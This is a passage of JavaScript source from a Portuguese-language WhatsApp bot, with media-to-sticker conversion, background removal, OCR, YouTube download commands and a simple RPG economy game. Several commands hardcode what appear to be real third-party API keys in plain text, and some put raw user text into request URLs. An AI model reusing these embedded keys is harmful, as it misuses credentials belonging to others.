tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`A conversão de ${tipe} para o sticker falhou`)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${ran} -o ${ran}`, async (error) => {
if (error) return reply(ptbr.stick())
loli.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: say1})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
//.addOutputOptions(["-y", "-vcodec libwebp", "-lossless 1", "-qscale 1", "-preset default", "-loop 0", "-an", "-vsync 0", "-s 512x512"])
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`, `scale='min(180,iw)':min'(180,ih)':force_original_aspect_ratio=decrease,fps=20, pad=180:180:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await loli.downloadAndSaveMediaMessage(encmedia)
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(ptbr.waitgif())
keyrmbg = 'sfFSzxRz7y6jYDwfxx47rCgz'
await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('ocorreu um erro')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(ptbr.stick())
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${ranw} -o ${ranw}`, async (error) => {
if (error) return reply(ptbr.stick())
loli.sendMessage(from, fs.readFileSync(ranw), sticker, {quoted: say1})
fs.unlinkSync(ranw)
})
})
})
} else {
reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
}
break

//_CONVERTE STICKER EM IMAGEM
case 'toimg':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
if (!isQuotedSticker) return reply('Você precisa marcar um sticker não animado para isso')
reply(ptbr.wait())
tomg = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
medtmg = await loli.downloadAndSaveMediaMessage(tomg)
ran = getRandom('.png')
exec(`ffmpeg -i ${medtmg} ${ran}`, (err) => {
fs.unlinkSync(medtmg)
if (err) return reply('❌falha ao converter sticker em imagem❌')
buffer = fs.readFileSync(ran)
loli.sendMessage(from, buffer, image, {
quoted: say1,
caption: '✅'
})
fs.unlinkSync(ran)
})
break

case 'togif': //Menu2
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
const encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const mediaaa = await loli.downloadAndSaveMediaMessage(encmediaaa)
reply(ptbr.wait())
a = await webp2gifFile(mediaaa)
mp4 = await getBuffer(a.result)
loli.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, quoted: say1, caption: '✅'})
fs.unlinkSync(mediaaa)
}
break

case 'togif223':
                    if(!isQuotedSticker) return data.reply('reply sticker!')
                    const mtdt = await loli.downloadAndSaveMediaMessage()
                    if(message.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) {
                        axios(`https://serv-api.zeks.xyz/sticker/togif`, { method: "post", headers: { "content-type": 'application/json' }, data: {base64: mtdt.toString('base64')}}).then(bf => {
                            loli.sendFileFromBase64(from, bf.data.result, 'to.gif', 'nih', message)
			})
                    } else {
                        axios(`https://api.zeks.me/sticker/png`, { method: "post", headers: { "content-type": 'application/json' }, data: { base64: mtdt.toString('base64')}}).then(bf => {
                            loli.sendFileFromBase64(from, bf.data.result, 'to.png', 'nih', message)
                        })
                    }
                    break


//_CONVERTE VÍDEO EM ÁUDIO
case 'tomp3': //Menu2
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from,
Presence.composing)
if (!isQuotedVideo) return reply(`Marque um vídeo com ${prefix}tomp3`)
reply(mess.wait)
mitri = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
duh = await loli.downloadAndSaveMediaMessage(mitri)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${duh} ${ran}`, (err) => {
fs.unlinkSync(duh)
if (err) return reply('❌falha ao converter video para mp3❌')
buffer = fs.readFileSync(ran)
loli.sendMessage(from, buffer, audio, {
mimetype: 'audio/mp4', quoted: say1
})
fs.unlinkSync(ran)
})
break


case 'ttp': //Menu2
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}ttp gado`)
reply(mess.wait)
hori = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=ChOkYbOT8&text=${q}`)
loli.sendMessage(from, hori, sticker, { quoted: say1 })
break

case 'wa.me':
case 'wame':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
options = {
text: `「 *LINK WHATSAPP* 」\n\n_Solicitado por_ : *@${pushname}*\n\nSeu link WhatsApp:\n\n*https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n🌞　　　　🛸　　　 　🌎　°　　🌓　•　　.°•　　　🚀 ✯✯　　
						  　　　★　*　　　　　°　　　　🛰　°·　　
						  .　　　•　°★　•
						  ▁▂▃▄▅▆▇▇▆▅▄▃🌲\nSe quiser trocar uma ideia salvar cntt pra status amizades etc.\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
contextInfo: {
mentionedJid: [sender]
}
}
loli.sendMessage(from, options, text, {
quoted: say1
})
break

//_CAPTURA O TEXTO NA IMAGEM
case 'ocr': //fuciona
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const ocrt = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const com = await loli.downloadAndSaveMediaMessage(ocrt)
reply(mess.wait)
await recognize(com, {lang: 'eng+ind', oem: 1, psm: 3})
.then(oc => {
reply(oc.trim())
fs.unlinkSync(com)
})
.catch(err => {
reply(err.message)
fs.unlinkSync(com)
})
} else {
reply(`Marque ou envie uma imagem com ${prefix}ocr para capturar o texto da imagem`)
}
break

case 'attp': //@Tobi
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${SeuNome} gado`)
reply(mess.only.tobiattp)
attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(body.slice(5))}`)
loli.sendMessage(from, attp2, sticker, {quoted: say1})
break
case 'attp1':	//愛	
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp ${SeuNome} gado*`)
teks = body.slice(6)
reply(mess.only.tobiattp)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp1?apikey=BOT SOPHIA&text=${teks}`)
send = await getBuffer(url)
loli.sendMessage(from, send, sticker, {quoted: say1})
break	     
case 'attp2':	//愛	
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp ${SeuNome} gado*`)                                
teks = body.slice(6)
reply(mess.only.tobiattp)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp2?apikey=BOT SOPHIA&text=${teks}`)
send = await getBuffer(url)
loli.sendMessage(from, send, sticker, {quoted: say1})
break	
case 'attp3': //愛	
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp ${SeuNome} gado*`)
teks = body.slice(6)
reply(mess.only.tobiattp)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp3?apikey=BOT SOPHIA&text=${teks}`)
send = await getBuffer(url)
loli.sendMessage(from, send, sticker, {quoted: say1})
break	
case 'attp4': //愛	
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp ${SeuNome} gado*`)
teks = body.slice(6)
reply(mess.only.tobiattp)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp4?apikey=BOT SOPHIA&text=${teks}`)
send = await getBuffer(url)
loli.sendMessage(from, send, sticker, {quoted: say1})
break	
case 'attp5': //愛	
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp ${SeuNome} gado*`)
teks = body.slice(6)
reply(mess.only.tobiattp)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp5?apikey=BOT SOPHIA&text=${teks}`)
send = await getBuffer(url)
loli.sendMessage(from, send, sticker, {quoted: say1})
break
case 'attp6':	//愛	
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isvipp) return reply('Você não é um Membro Vip, entre em contato com o proprietário ou digite *.buyvip* para comprar acesso Vip!')
if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}attp ${SeuNome} gado*`)
teks = body.slice(6)
reply(mess.only.tobiattp)
url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp6?apikey=BOT SOPHIA&text=${teks}`)
send = await getBuffer(url)
loli.sendMessage(from, send, sticker, {quoted: say1})
break        
case 'playteste':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply('digite o nome da musica')
reply(mess.wait)
var query = args.join(' ')
if (!query.endsWith("-doc")){
res = await yts(`${query}`).catch(e => {
reply('[ ! ] Erro ao baixar e enviar mídia')
})
let thumbInfo = `「 ⭐HENPLAY MUSIC⭐」
💜 Título: ${res.all[0].title}
💜 ID Video: ${res.all[0].videoId}
💜 Data da postagem : ${res.all[0].ago}
💜 Visualizações : ${res.all[0].views}
💜 Duração: ${res.all[0].timestamp}
💜 Canal: ${res.all[0].author.name}
💜 Link do Canal:  ${res.all[0].author.url}
`
kkkkkkmuitoSexo = await getBuffer(res.all[0].image)
sendButImage(from, `${thumbInfo}`, `🖤✨Escolha entre as tres opções.✨🖤`, kkkkkkmuitoSexo, [{buttonId: `${prefix}play6 ${q}`, buttonText: {displayText: `🍷𝙖𝙪𝙙𝙞𝙤🍷`,}, type: 1,}, {
buttonId: `${prefix}playvid2 {q}`, buttonText: {displayText: `🍷𝙑𝙄𝘿𝙀𝙊🍷`}, type: 1}, {buttonId: `${prefix}play7 ${q}`, buttonText: {displayText: `🍷𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩𝙤🍷`}, type: 1}])
res = await y2mateA(res.all[0].url).catch(e => {
reply('[ ! ] Erro ao entrar no Y2mate Web Tente repetir')
})
}
break

 case 'playteste333':
                if (!q) return reply('a link ou nome da música?')
               buttons2234 = [{ buttonId: `${prefix}ytmp4 ${q}`, buttonText: { displayText: `🎥 Video` }, type: 1 }, { buttonId: `${prefix}play7 ${q}`, buttonText: { displayText: '🎵 Mp3' }, type: 1 }]
                imageMsg = (await loli.prepareMessageMedia(fs.readFileSync(`./lib/logo.jpeg`), 'imageMessage', { thumbnail: fs.readFileSync(`./lib/logo.jpeg`) })).imageMessage
                buttonsMessage = {
                    footerText: 'Calma mestre estou fazendo 📌', imageMessage: imageMsg,
                    contentText: `Selecione a mídia que será baixada`, buttons2234, headerType: 4
                }
                prep = await loli.prepareMessageFromContent(from, { buttonsMessage }, { quoted: mek })
                loli.relayWAMessage(prep)
                break


case 'play7':
addFilter(from) 
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res = await yts(`${q}`).catch(e => {
reply('[ ! ] O erro de consulta inserido não existe')
})
res = await y2mateA(res.all[0].url).catch(e => {
reply('[ ! ] Erro ao entrar no Y2mate Web * Tente repetir*')
})
sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
break

case 'play6':
addFilter(from) 
teks = args.join(' ')
if (!teks.endsWith("-doc")){
res = await yts(`${q}`).catch(e => {
reply('[ ! ] O erro de consulta inserido não existe')
})
res = await y2mateA(res.all[0].url).catch(e => {
reply('[ ! ] Erro ao entrar no Y2mate Web * Tente repetir*')
})
sendFileFromUrl(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
break

case 'playvid2':
addFilter(from) 
if (!q.endsWith("-doc")){
res = await yts(`${q}`).catch(e => {
reply('[ ! ] Erro ao baixar e enviar mídia')
})
res = await y2mateA(res.all[0].url).catch(e => {
reply('[ ! ] Erro ao entrar no Y2mate Web Tente repetir')
})
sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
}
break    
      case 'indefinido24455':
	 if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
      if (args.length < 1) return reply("cade o nome o-onichan")
      reply(mess.wait)
      query = args.join(" ")
      get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytplay2?apikey=ChOkYbOT8&query=${query}`)
       get_result = get_result.result
       ini_txt = `「 ⭐*HENPLAY MUSIC*⭐」\n\n`
        
        ini_txt += `• *Titulo* : ${get_result.title}\n`
        ini_txt += `• *Formato*  : mp4\n`
        ini_txt += `• *💜 DOWNLOAD  CONCLUÍDO 💜* `
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    loli.sendMessage(from, ini_buffer, image, { quoted: say1, thumbnail:null, caption: ini_txt })
                    get_video = await getBuffer(get_result.video)
                    loli.sendMessage(from, get_video, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: mek, thumbnail:null})
                    break
                    
                    case 'ytmp4indefinido444':
                    addFilter(from)
 if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
      if (args.length < 1) return reply("cade o nome o-onichan")
teks = args.join(' ')
      reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Erro ao baixar e enviar mídia_')
})
reply(`.•♫•♬• ${res.all[0].title} •♬•♫•.`)
let thumbInfo = `「 ⭐*HENPLAY MUSIC*⭐」
🎯 *Título:* ${res.all[0].title}
📼 *ID Video:* ${res.all[0].videoId}
📆 *Data da postagem :* ${res.all[0].ago}
♨️ *Visualizações :* ${res.all[0].views}
⏳ *Duração:* ${res.all[0].timestamp}
📁 *Canal:* ${res.all[0].author.name}
📊 *Link do Canal:* ${res.all[0].author.url}

*• 💜 DOWNLOAD  CONCLUÍDO 💜*
`
sendFileFromUrl(res.all[0].image, image, {quoted: say1, thumbnail:null, caption: thumbInfo})
res = await y2mateV(res.all[0].url).catch(e => {
reply('_[ ! ] Erro ao entrar no Y2mate Web *Tente repetir*_')
})
sendFileFromUrl(res[0].link, video, {mimetype: 'video/mp4', filename: res[0].output, quoted: say1, thumbnail:null})
}
break
case 'play1':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo : ${prefix}play Vmz Bad Girl`)	
reply(mess.wait)
play = body.slice(5)
anu = await fetchJson(`https://api.zeks.me/api/ytplaymp3?q=${play}&apikey=apivinz`)
if (anu.error) return reply(anu.error)
infomp3 = `*Música encontrada\n*🚫 Espere a música, ou leva ban no chat 🚫*`
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url_audio)
loli.sendMessage(from, buffer, image, {quoted: say1, caption: infomp3})
loli.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: say1})
break
// arquivos henplay

case 'joinrpg':
addFilter(from)

		  if (isPetualang) return reply('Você se tornou um aventureiro')
	   	  _petualang.push(sender)
		  fs.writeFileSync('./inventori.json', JSON.stringify(_petualang))
		  capt = `Parabéns ${pushname}🎊\nVocê está registrado como um aventureiro!\nPor favor digite ${prefix}rpgmenu`
		  loli.sendMessage(from, capt, text, {quoted: mek})		
		  addInventori(sender)
		  break

case 'quest':
 addFilter(from)
 if (!isPetualang) return reply(mess.only.player)
 listMsg = {
 buttonText: 'LISTA DE MISSÃO',
 footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
 description: `Olá ${pushname}, sou Hori!!\nSou o administradora da missão neste grupo! \nPor favor, escolha uma missão que corresponda ao seu nível!💜`,
 sections: [
                     {
                      "title": `Escolha a missão de acordo com o seu nível!`,
  rows: [
                          {
                              "title": "Matar Slime, Lvl Bronze",
                              "rowId": "slime"
                           },
                           {
                              "title": "Matar Goblin, Lvl prata",
                              "rowId": "!goblin"
                           },
                           {
                              "title": "Matar Evil Eye, Lvl ouro",
                              "rowId": "evil"
                           },
                           {
                              "title": "Matar Behemoth, Lvl platinum",
                              "rowId": "behemoth"
                           },                            
                           {
                              "title": "Matar Cockatrice, Lvl Mithril",
                              "rowId": "!cockatrice"
                           },
                           {
                              "title": "Matar Four Fiends, Lvl Oricalco",
                              "rowId": "!4fiends"
                           },
                           {
                              "title": "Matar Demond King, Lvl Adamante",
                              "rowId": "!demondking"
                           }
                        ]
                     }],
 listType: 1
}
loli.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:say1})
break

case 'aventura':
addFilter(from)
       if (isLimit(sender, isvipp, isOwner, limitCount, limit)) return reply(`Opa desculpa onii-chan seu limite acabou\nUse: !buylimite`)
   	                                                        
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)		
	      ngab = ['Avalanche','Erupção vulcânica','Tsunami','Terremoto','Meteoros','Demônio']
	      const sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
          const dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
	      const ad = dungeon[Math.floor(Math.random() * dungeon.length)]
	      anu = fs.readFileSync('./lib/rpg/dungeon.js');
          jsonData = JSON.parse(anu);
	      randIndex = Math.floor(Math.random() * jsonData.length);
          randKey = jsonData[randIndex];
	      hasm = await getBuffer(randKey.result)  
	      const adven = Math.ceil(Math.random() * 50)          
	      const money = Math.ceil(Math.random() * 30)					      	      
	      setTimeout( () => {		
          caption = monospace(`「 MORTE 」\n\n • O lugar  ${ad}\n • CASH : ${money}\n • EXP : ${adven}Xp`)
          but = [
          { buttonId: `${prefix}inventario`, buttonText: { displayText: 'MOCHILA' }, type: 1 }]
          sendButLocation(from, caption, 'DUNGEON', hasm, but, {quoted: mek})   
          }, 7000)
          setTimeout( () => {
		  loli.sendMessage(from, `atenção`, text) 
		  }, 5000) // 1000 = 1s,
	      setTimeout( () => {
		  loli.sendMessage(from, `De repente lá ${sesuatu}`, text) 
		  }, 3000) // 1000 = 1s,
		  setTimeout( () => {
		  loli.sendMessage(from, `${pushname} em uma aventura`, text) 
		  }, 1500) // 1000 = 1s,
		  addLevelingXp(sender, adven)
		  addBalance(sender, money, balance) 
          limitAdd(sender, limit) 
          await healtAdd(sender)
          break

case 'minerar':   
addFilter(from)
   	     if (isLimit(sender, isvipp, isOwner, limitCount, limit)) return reply(`Opa desculpa onii-chan seu limite acabou\nUse: !buylimite`)
   	                                                           
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)
          pp = randomNomor(3)
          emas = randomNomor(3)
          dm = randomNomor(2)
          besi = randomNomor(3)
          done = monospace(`Finalizar Mineração🚧\nlistar resultados :\nOuro : ${emas}🪙\ncash : $${pp}💰\nFerro : ${besi}⛓️\nDiamante : ${dm}💎`)
          addBalance(sender, pp, balance)          
          addBesi(sender, besi)
          addEmas(sender, emas)
          addDm(sender, dm)
          mining = ('espere está calibrando...')
		  setTimeout( () => {		//case by zadik
		  const but = [{ buttonId: `${prefix}minerar`, buttonText: { displayText: 'Minerar novamente' }, type: 1 }]
          sendButton(from, done, 'Mineração', but)
		  }, 9000) // 1000 = 1s,
		  setTimeout( () => {
		  loli.sendMessage(from, '🚧 terminou de escavar. . .🪙👷', text) 
		  }, 7000) // 1000 = 1s,
	      setTimeout( () => {
		  loli.sendMessage(from, '🚧 encontrando recursos. . .⚒️🏔️️️', text) 
		  }, 4000) // 1000 = 1s,
		  setTimeout( () => {
		  loli.sendMessage(from, '🚧 iniciar a mineração. . .⚒️🏔️️', text) 
		  }, 1500) // 1000 = 1s,
		  setTimeout( () => {
		  loli.sendMessage(from, mining, text, {quoted: mek}) 
		  }, 0) // 1000 = 1s,
                 limitAdd(sender, limit) 
	      break

 case 'pescar':
         if (isLimit(sender, isvipp, isOwner, limitCount, limit)) return reply(`Opa desculpa onii-chan seu limite acabou\nUse: !buylimite`)
   	                                                          
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)	
          ikannya = ikan[Math.floor(Math.random() * ikan.length)]
	      xp = Math.ceil(Math.random() * 150)          
	      coin = randomNomor(15)	    
	      ditangkap = Math.ceil(Math.random() * 10)
	      cing = await getBuffer(`https://telegra.ph/file/d9b15de4f661808dfd0b9.jpg`)
	      setTimeout( () => {
	      caption = monospace(`「 pescaria」\n\n • A pegada : ${ikannya}\n • Ganho total : ${ditangkap} Peixe\n • CASH : ${coin}\n • EXP : ${xp}Xp`)
          but = [
          { buttonId: `${prefix}pescar`, buttonText: { displayText: 'Pescar novamente' }, type: 1 },
          { buttonId: `${prefix}inventario`, buttonText: { displayText: 'Verificar inventário' }, type: 1 }
           ]
          sendButLocation(from, caption, 'pescaria', cing, but, {quoted: mek})      
          }, 6000)
          setTimeout( () => {
		  loli.sendMessage(from, 'Obter Peixes com Sucesso. . .', text) 
		  }, 5000) // 1000 = 1s,
	      setTimeout( () => {
		  loli.sendMessage(from, '🎣Puxe o gancho. . .', text) 
		  }, 3000) // 1000 = 1s,
		  setTimeout( () => {
		  loli.sendMessage(from, '🎣Comece a pescar. . .', text) 
		  }, 1500) // 1000 = 1s,
		  addFish(sender, ditangkap)
		  addLevelingXp(sender, xp)
		  addBalance(sender, coin, balance) 
          limitAdd(sender, limit)         
	      break

 case 'venderpeixe':
         
   	      if (isNaN(args[0])) return reply('CUIDADO USE DA FORMA CORRETA OU PODE PERDER TODA A QUANTIA')                                               
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)
          if (args.length < 1) return reply(`Enviar pedidos *${prefix + command}* quantidade que deseja vender`)      
          jmlh =  args.join(" ")
          rp = 5 * jmlh
          if (getFish(sender) < jmlh) return reply(`Seu peixe não é suficiente`)
          sellFish(sender, jmlh, balance)
          addBalance(sender, rp, balance) 
          capti = monospace(`🛒 𝗺𝗲𝗿𝗰𝗮𝗱𝗼\n • Vendedor : ${pushname}\n • Comprador : 𝗛𝗼𝗿𝗶\n • Preço/Peixe : 5\n • Situação: Sucesso \n • Restos de Peixe : ${getFish(sender)}\n • Resultados de vendas : $${rp}`)
          but = [{ buttonId: `${prefix}inventario`, buttonText: { displayText: 'Verificar inventário' }, type: 1 }]
          sendButton(from, capti, 'venda', but)          
          break
    case 'venderferro':
        
   	     if (isNaN(args[0])) return reply('CUIDADO USE DA FORMA CORRETA OU PODE PERDER TODA A QUANTIA')                                                       
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)
          if (args.length < 1) return reply(`Enviar pedidos *${prefix + command}* quantidade que deseja vender`)      
          jmlh = args.join(" ")
          rp = 10 * jmlh
          if (getBesi(sender) < jmlh) return reply(`Seu ferro não é suficiente`)
          sellBesi(sender, jmlh, balance)
          addBalance(sender, rp, balance) 
          capti = monospace(`🛒 𝗺𝗲𝗿𝗰𝗮𝗱𝗼\n • Vendedor : ${pushname}\n • Comprador : 𝗛𝗼𝗿𝗶\n • Preço/Ferro : 10\n • Situação: Sucesso \n • Restos de Ferro : ${getBesi(sender)}\n • Resultados de vendas : $${rp}`)
          but = [{ buttonId: `${prefix}inventario`, buttonText: { displayText: 'Verificar inventário' }, type: 1 }]
          sendButton(from, capti, 'venda', but)                    
          break          
    case 'venderouro':
        
   	      if (isNaN(args[0])) return reply('CUIDADO USE DA FORMA CORRETA OU PODE PERDER TODA A QUANTIA')                                                      
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)
          if (args.length < 1) return reply(`Enviar pedidos *${prefix + command}* quantidade que deseja vender`)      
          jmlh = args.join(" ")
          rp = 25 * jmlh
          if (getEmas(sender) < jmlh) return reply(`Seu ouro não é suficiente`)
          sellEmas(sender, jmlh, balance)
          addBalance(sender, rp, balance) 
          capti = monospace(`🛒 𝗺𝗲𝗿𝗰𝗮𝗱𝗼\n • Vendedor: ${pushname}\n • Comprador : 𝗛𝗼𝗿𝗶\n • Preço/ouro : 25\n • Situação: Sucesso \n • Ouro restante : ${getEmas(sender)}\n • Resultados de vendas : $${rp}`)
          but = [{ buttonId: `${prefix}inventario`, buttonText: { displayText: 'Verificar inventário' }, type: 1 }]
          sendButton(from, capti, 'venda', but)                    
          break 
    case 'venderdiamante':
   	                                                           
          if (!isPetualang) return reply(`Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`)
          if (args.length < 1) return reply(`Enviar pedidos *${prefix + command}* quantidade que deseja vender`)   
          if (isNaN(args[0])) return reply('CUIDADO USE DA FORMA CORRETA OU PODE PERDER TODA A QUANTIA')      
          ttl = args.join(" ")
          var etoo = 75 * ttl
          if (getDm(sender) < ttl) return reply(`Seu ferro não é suficiente`)
          sellDm(sender, ttl)
          addBalance(sender, etoo, balance) 
          capti = monospace(`🛒 𝗺𝗲𝗿𝗰𝗮𝗱𝗼\n • Vendedor: ${pushname}\n • Comprador : 𝗛𝗼𝗿𝗶\n • Preço/Diamante : 75\n • Situação: Sucesso \n • Diamante restante : ${getDm(sender)}\n • Resultados de vendas : $${etoo}`)
          but = [{ buttonId: `${prefix}inventario`, buttonText: { displayText: 'Verificar inventário' }, type: 1 }]
